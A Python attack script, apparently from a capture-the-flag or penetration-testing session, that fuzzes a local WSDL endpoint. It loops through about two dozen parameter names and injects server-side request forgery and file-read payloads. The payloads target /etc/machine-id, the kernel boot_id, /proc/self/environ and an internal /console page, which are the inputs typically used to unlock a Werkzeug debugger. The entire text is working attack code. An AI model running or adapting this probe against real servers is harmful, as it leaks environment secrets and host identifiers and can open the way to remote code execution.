import urllib.parse, urllib.request
from urllib.error import HTTPError, URLError
base = 'http://localhost:80/wsdl'
params = [
    'url','u','target','uri','wsdl','wsdl_url','wsdlUrl','location','address','endpoint','source','schema','xsd','document','link','fetch','path','file','resource','remote','load','q','p','href'
]
values = [
    'file:///etc/machine-id',
    'file:///proc/sys/kernel/random/boot_id',
    'file:///proc/self/environ',
    'file:///etc/hosts',
    'http://127.0.0.1:80/console',
    'http://127.0.0.1:80/login',
]
results = []
for p in params:
    for v in values:
        url = f"{base}?{urllib.parse.urlencode({p: v})}"
        try:
            with urllib.request.urlopen(url, timeout=6) as resp:
                data = resp.read()
                results.append({
                    'p': p,
                    'v': v,
                    'code': resp.getcode(),
                    'ctype': resp.headers.get('Content-Type'),
                    'clen': len(data),
                    'snippet': data[:120].decode('latin1', 'ignore')
                })
        except HTTPError as e:
            results.append({'p': p, 'v': v, 'code': e.code, 'err': 'HTTPError'})
        except URLError as e:
            results.append({'p': p, 'v': v, 'code': None, 'err': 'URLError'})
        except Exception as e:
            results.append({'p': p, 'v': v, 'code': None, 'err': str(e)[:80]})

for r in results:
    if (r.get('clen') or 0) > 0 or r.get('err'):
        print(r)

